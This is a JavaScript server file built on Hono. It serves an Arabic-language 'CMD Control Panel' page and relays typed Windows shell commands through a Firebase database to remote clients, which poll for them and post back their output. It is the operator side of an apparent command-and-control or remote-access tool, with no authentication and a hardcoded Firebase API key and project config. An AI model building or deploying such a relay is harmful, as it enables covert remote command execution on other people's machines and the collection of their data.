import { Hono } from 'hono';
import { cors } from 'hono/cors';

const app = new Hono();

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyC07Gs8L5vxlUmC561PKbxthewA1mrxYDk",
  authDomain: "zylos-test.firebaseapp.com",
  databaseURL: "https://zylos-test-default-rtdb.firebaseio.com",
  projectId: "zylos-test",
  storageBucket: "zylos-test.firebasestorage.app",
  messagingSenderId: "553027007913",
  appId: "1:553027007913:web:2daa37ddf2b2c7c20b00b8"
};

// Enable CORS
app.use('*', cors());

// HTML Page
const htmlPage = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD Control Panel</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .output {
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            min-height: 200px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            overflow-y: auto;
        }
        .loading {
            color: #667eea;
            font-style: italic;
        }
        .error {
            color: #dc3545;
        }
        .success {
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ لوحة التحكم في الأوامر</h1>
        
        <div class="input-group">
            <label for="command">أدخل الأمر:</label>
            <input type="text" id="command" placeholder="مثال: dir, ipconfig, systeminfo">
        </div>
        
        <button onclick="executeCommand()">تنفيذ الأمر</button>
        
        <div class="output" id="output">انتظار الأوامر...</div>
    </div>

    <script>
        async function executeCommand() {
            const command = document.getElementById('command').value.trim();
            const output = document.getElementById('output');
            
            if (!command) {
                output.innerHTML = '<span class="error">يرجى إدخال أمر صحيح</span>';
                return;
            }
            
            output.innerHTML = '<span class="loading">جاري تنفيذ الأمر...</span>';
            
            try {
                const response = await fetch('/api/execute', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ command: command })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Wait for result from client
                    await waitForResult(result.commandId);
                } else {
                    output.innerHTML = '<span class="error">خطأ: ' + result.error + '</span>';
                }
            } catch (error) {
                output.innerHTML = '<span class="error">خطأ في الاتصال: ' + error.message + '</span>';
            }
        }
        
        async function waitForResult(commandId) {
            const output = document.getElementById('output');
            let attempts = 0;
            const maxAttempts = 30; // Wait 30 seconds max
            
            const checkResult = async () => {
                try {
                    const response = await fetch('/api/result/' + commandId);
                    const result = await response.json();
                    
                    if (result.output) {
                        output.innerHTML = '<span class="success">نتيجة الأمر:</span>\\n' + result.output;
                        return;
                    }
                    
                    attempts++;
                    if (attempts < maxAttempts) {
                        setTimeout(checkResult, 1000);
                    } else {
                        output.innerHTML = '<span class="error">انتهت مهلة انتظار النتيجة</span>';
                    }
                } catch (error) {
                    output.innerHTML = '<span class="error">خطأ في استقبال النتيجة: ' + error.message + '</span>';
                }
            };
            
            setTimeout(checkResult, 1000);
        }
        
        // Allow Enter key to execute
        document.getElementById('command').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
    </script>
</body>
</html>
`;

// Serve HTML page
app.get('/', (c) => {
  return c.html(htmlPage);
});

// API to send command to Firebase
app.post('/api/execute', async (c) => {
  try {
    const { command } = await c.req.json();
    const commandId = Date.now().toString();
    
    // Send command to Firebase
    const firebaseUrl = `${firebaseConfig.databaseURL}/commands/${commandId}.json`;
    
    await fetch(firebaseUrl, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        command: command,
        timestamp: Date.now(),
        status: 'pending'
      })
    });
    
    return c.json({ success: true, commandId: commandId });
  } catch (error) {
    return c.json({ success: false, error: error.message });
  }
});

// API to get command result from Firebase
app.get('/api/result/:commandId', async (c) => {
  try {
    const commandId = c.req.param('commandId');
    const firebaseUrl = `${firebaseConfig.databaseURL}/results/${commandId}.json`;
    
    const response = await fetch(firebaseUrl);
    const result = await response.json();
    
    if (result && result.output) {
      return c.json({ output: result.output });
    } else {
      return c.json({ output: null });
    }
  } catch (error) {
    return c.json({ output: null, error: error.message });
  }
});

// API for client to get pending commands
app.get('/api/commands', async (c) => {
  try {
    const firebaseUrl = `${firebaseConfig.databaseURL}/commands.json?orderBy="status"&equalTo="pending"`;
    const response = await fetch(firebaseUrl);
    const commands = await response.json();
    
    return c.json(commands || {});
  } catch (error) {
    return c.json({});
  }
});

// API for client to submit command result
app.post('/api/submit-result', async (c) => {
  try {
    const { commandId, output, error } = await c.req.json();
    
    // Save result to Firebase
    const resultUrl = `${firebaseConfig.databaseURL}/results/${commandId}.json`;
    await fetch(resultUrl, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        output: output || error,
        timestamp: Date.now(),
        success: !error
      })
    });
    
    // Update command status
    const commandUrl = `${firebaseConfig.databaseURL}/commands/${commandId}/status.json`;
    await fetch(commandUrl, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify("completed")
    });
    
    return c.json({ success: true });
  } catch (error) {
    return c.json({ success: false, error: error.message });
  }
});

export default app;